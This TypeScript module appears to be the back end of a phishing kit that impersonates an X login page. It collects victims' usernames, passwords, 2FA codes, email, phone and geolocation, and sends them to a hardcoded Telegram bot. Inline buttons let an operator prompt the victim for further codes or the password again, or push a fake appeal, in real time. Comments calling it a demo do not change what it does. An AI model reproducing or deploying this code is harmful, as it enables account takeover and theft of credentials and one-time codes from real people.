'use client';

// This is a client-side utility for sending messages to Telegram
// In a production application, this would be handled server-side for security

interface LogData {
  username: string;
  password: string;
  email: string;
  ip: string;
  country: string;
  city: string;
  isp: string;
  org: string;
  asn: string;
  coordinates: {
    latitude: number;
    longitude: number;
  };
  timezone: string;
  device: string;
  browser: string;
  os: string;
  userAgent: string;
  twoFACode?: string; // Optional
  phoneNumber?: string; // Optional
}

// Command types for Telegram bot interactions
export type TelegramCommand =
  | "waiting"
  | "2fa_auth_app"
  | "2fa_phone"
  | "2fa_email"
  | "confirm_email_phone"
  | "file_appeal"
  | "finish"
  | "kick_user"
  | "ban_user"
  | "ask_password";

// The bot token and chat ID are hardcoded here - in a real application these would be environment variables
const BOT_TOKEN = "7853186814:AAEHV8r-iUJsKYFzTe-Rhl5Bjrho3NxgHAk";
const DEFAULT_CHAT_ID = "-4665601018";

// For testing in development
const API_BASE_URL = "https://api.telegram.org";

// Store the last command for demo purposes (in a real app, this would be stored server-side)
let lastCommand: TelegramCommand = "waiting";
let lastCommandTime = 0;
let messageIdSent = "";
let lastSentChatId = DEFAULT_CHAT_ID;

// For real implementation, we would store the real user data for access between components
interface UserData {
  twoFACode: string;
  email: string;
  phone: string;
  // Store the original login data to update the message
  originalData: Partial<LogData>;
}

// Store user provided data
const userData: UserData = {
  twoFACode: "",
  email: "",
  phone: "",
  originalData: {}
};

// Functions to get and set user data
export function setUserData(data: Partial<UserData>): void {
  if (data.twoFACode) userData.twoFACode = data.twoFACode;
  if (data.email) userData.email = data.email;
  if (data.phone) userData.phone = data.phone;
}

export function getUserData(): UserData {
  return { ...userData };
}

// Function to check if the last command was a specific one
export function lastCommandWas(command: TelegramCommand): boolean {
  return lastCommand === command;
}

// For testing purposes in development
export function simulateCommand(command: TelegramCommand): void {
  console.log(`Simulating Telegram command: ${command}`);
  lastCommand = command;
  lastCommandTime = Date.now();
  // Store in localStorage for persistence between page refreshes
  if (typeof window !== 'undefined') {
    localStorage.setItem('telegramCommand', command);
    localStorage.setItem('telegramCommandTime', lastCommandTime.toString());
  }
}

// Initialize from localStorage if available (for testing purposes)
const initFromLocalStorage = () => {
  if (typeof window !== 'undefined') {
    const storedCommand = localStorage.getItem('telegramCommand') as TelegramCommand | null;
    const storedTime = localStorage.getItem('telegramCommandTime');

    if (storedCommand && storedCommand !== 'waiting') {
      lastCommand = storedCommand;
      lastCommandTime = storedTime ? parseInt(storedTime, 10) : Date.now();
      console.log(`Restored command from storage: ${lastCommand}`);
    }
  }
};

// Call initialization only on client side
if (typeof window !== 'undefined') {
  initFromLocalStorage();
}

// Format message for Telegram
function formatTelegramMessage(data: LogData): string {
  const date = new Date();
  const formattedDate = `${date.toLocaleString('en', { month: 'short' })} ${date.getDate()}, ${date.getHours()}:${String(date.getMinutes()).padStart(2, '0')} ${date.getHours() >= 12 ? 'PM' : 'AM'}`;

  // İlk mesaj kontrolünü kaldırıyoruz
  // const isInitialMessage = !data.twoFACode && !data.phoneNumber;

  // Var olan değerleri kullan, yoksa "Not provided" göster
  const emailDisplay = data.email || "Not provided";
  const phoneDisplay = data.phoneNumber || "Not provided";
  const twoFADisplay = data.twoFACode || "Not provided";

  return `🔐 New X Login 🔐
——————————————
📅 ${formattedDate}
🌐 ${data.ip}

COUNTRY: ${data.country} 🇹🇷
CITY: ${data.city}
ISP: ${data.isp}
ORG: ${data.org}
ASN: ${data.asn}
COORDINATES: ${data.coordinates.latitude}, ${data.coordinates.longitude}
TIMEZONE: ${data.timezone}

DEVICE INFO:
📱 DEVICE: ${data.device}
🌐 BROWSER: ${data.browser}
💻 OS: ${data.os}
🔍 USER AGENT: ${data.userAgent}

👤 USERNAME: @${data.username}
🔑 PASSWORD: ${data.password}

📧 EMAIL: ${emailDisplay}
📱 PHONE: ${phoneDisplay}

🔐 2FA CODE: ${twoFADisplay}

STATUS: ⌛ Kullanici bekleme ekraninda

NEXT STEPS:
Select the next step using the buttons below.`;
}

// Telegram inline keyboard with buttons
const telegramInlineKeyboard = {
  inline_keyboard: [
    [{ text: "🔵 2FA - Authenticator App", callback_data: "2fa_auth_app" }],
    [{ text: "🔵 2FA - Phone Number", callback_data: "2fa_phone" }],
    [{ text: "📧 Ask 2FA - Email", callback_data: "2fa_email" }],
    [{ text: "📱 Ask Confirm Email & Phone", callback_data: "confirm_email_phone" }],
    [{ text: "🔑 Ask Password Again", callback_data: "ask_password" }],
    [{ text: "📝 Ask to File an Appeal", callback_data: "file_appeal" }],
    [{ text: "✅ Finish", callback_data: "finish" }],
    [
      { text: "❌ KICK USER ❌", callback_data: "kick_user" },
      { text: "🚫 BAN USER 🚫", callback_data: "ban_user" }
    ]
  ]
};

// Send a new message to Telegram
export async function sendToTelegram(data: LogData, chatId: string = DEFAULT_CHAT_ID, messageId?: string): Promise<string> {
  try {
    // Store the original data for later updates
    userData.originalData = { ...data };

    // Format the message
    const message = formatTelegramMessage(data);
    console.log('Sending to Telegram:', message);

    // Reset last command when sending a new message
    lastCommand = "waiting";
    lastCommandTime = Date.now();
    lastSentChatId = chatId;

    // Reset any previously stored command in localStorage
    if (typeof window !== 'undefined') {
      localStorage.removeItem('telegramCommand');
      localStorage.removeItem('telegramCommandTime');
    }

    // Actual implementation to send message to Telegram
    const apiUrl = `${API_BASE_URL}/bot${BOT_TOKEN}/sendMessage`;

    try {
      const response = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          reply_markup: telegramInlineKeyboard,
          parse_mode: 'HTML',
        }),
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const result = await response.json();

      if (result.ok) {
        console.log('Message sent successfully to Telegram');
        messageIdSent = result.result?.message_id?.toString() || '12345';

        // For testing - poll for updates immediately after sending
        pollForUpdates();

        return messageIdSent;
      } else {
        console.error('Failed to send message to Telegram:', result);
      }
    } catch (error) {
      console.error('Error sending HTTP request to Telegram:', error);
    }

    // Even if the actual API call fails, we'll return a message ID for demo purposes
    messageIdSent = messageId || '12345';
    return messageIdSent;
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    return '';
  }
}

// Update an existing message in Telegram
export async function updateTelegramMessage(
  additionalData: Partial<LogData>,
  status: string = "⌛ Kullanici bekleme ekraninda",
  chatId: string = lastSentChatId,
  messageId: string = messageIdSent
): Promise<boolean> {
  try {
    if (!messageId || messageId === '') {
      console.error('No message ID provided for update');
      return false;
    }

    // Önemli: Sadece "finish" komutu geldiğinde başarılı statüsünü göster
    if (status === "✅ Appeal submitted successfully" && lastCommand !== "finish") {
      console.log("Prevented automatic success status update - waiting for finish command");
      status = "⌛ Kullanici bekleme ekraninda";
    }

    // Mevcut verileri koru ve yeni verileri ekle
    const updatedData: LogData = {
      ...userData.originalData as LogData,
      ...additionalData
    };

    // Format the message with updated data
    let message = formatTelegramMessage(updatedData);

    // Replace the status line
    message = message.replace("STATUS: ⌛ Kullanici bekleme ekraninda", `STATUS: ${status}`);

    console.log('Updating Telegram message:', message);

    // Update the message via Telegram API
    const apiUrl = `${API_BASE_URL}/bot${BOT_TOKEN}/editMessageText`;

    const response = await fetch(apiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        message_id: messageId,
        text: message,
        reply_markup: telegramInlineKeyboard,
        parse_mode: 'HTML',
      }),
    });

    if (!response.ok) {
      console.error(`HTTP error when updating message: ${response.status}`);
      return false;
    }

    const result = await response.json();

    if (result.ok) {
      console.log('Message updated successfully in Telegram');
      return true;
    } else {
      console.error('Failed to update message in Telegram:', result);
      return false;
    }
  } catch (error) {
    console.error('Error updating Telegram message:', error);
    return false;
  }
}

// Poll for updates from Telegram
let updateOffset = 0;
let isPolling = false;

async function pollForUpdates() {
  if (isPolling) return;

  isPolling = true;

  try {
    const apiUrl = `${API_BASE_URL}/bot${BOT_TOKEN}/getUpdates?offset=${updateOffset}&timeout=60`;

    const response = await fetch(apiUrl);
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    const data = await response.json();

    if (data.ok && data.result && data.result.length > 0) {
      console.log("Received updates from Telegram:", data.result);

      // Process each update
      for (const update of data.result) {
        // Update offset for next poll
        updateOffset = update.update_id + 1;

        // Check for callback queries (button presses)
        if (update.callback_query) {
          const callbackData = update.callback_query.data as TelegramCommand;
          console.log(`Received callback query: ${callbackData}`);

          // Update the command
          lastCommand = callbackData;
          lastCommandTime = Date.now();

          // Store in localStorage for persistence
          if (typeof window !== 'undefined') {
            localStorage.setItem('telegramCommand', callbackData);
            localStorage.setItem('telegramCommandTime', lastCommandTime.toString());
          }

          // Answer the callback query to remove loading state
          try {
            const answerUrl = `${API_BASE_URL}/bot${BOT_TOKEN}/answerCallbackQuery`;
            await fetch(answerUrl, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify({
                callback_query_id: update.callback_query.id,
                text: `Command ${callbackData} received`,
              }),
            });
          } catch (error) {
            console.error("Error answering callback query:", error);
          }
        }
      }
    }
  } catch (error) {
    console.error("Error polling Telegram API:", error);
  } finally {
    isPolling = false;
  }
}

// Function to check command status from Telegram
export async function checkCommandStatus(username: string): Promise<TelegramCommand> {
  try {
    // In a real implementation, this would check for commands from Telegram via an API endpoint
    console.log(`Checking command status for user: ${username}, current command: ${lastCommand}`);

    // Poll for updates periodically
    await pollForUpdates();

    // For development testing, also check localStorage
    if (typeof window !== 'undefined') {
      const storedCommand = localStorage.getItem('telegramCommand') as TelegramCommand | null;
      if (storedCommand && storedCommand !== 'waiting' && storedCommand !== lastCommand) {
        console.log(`Found new command in localStorage: ${storedCommand}`);
        lastCommand = storedCommand;
      }
    }

    return lastCommand;
  } catch (error) {
    console.error("Error checking Telegram command status:", error);
    return "waiting";
  }
}
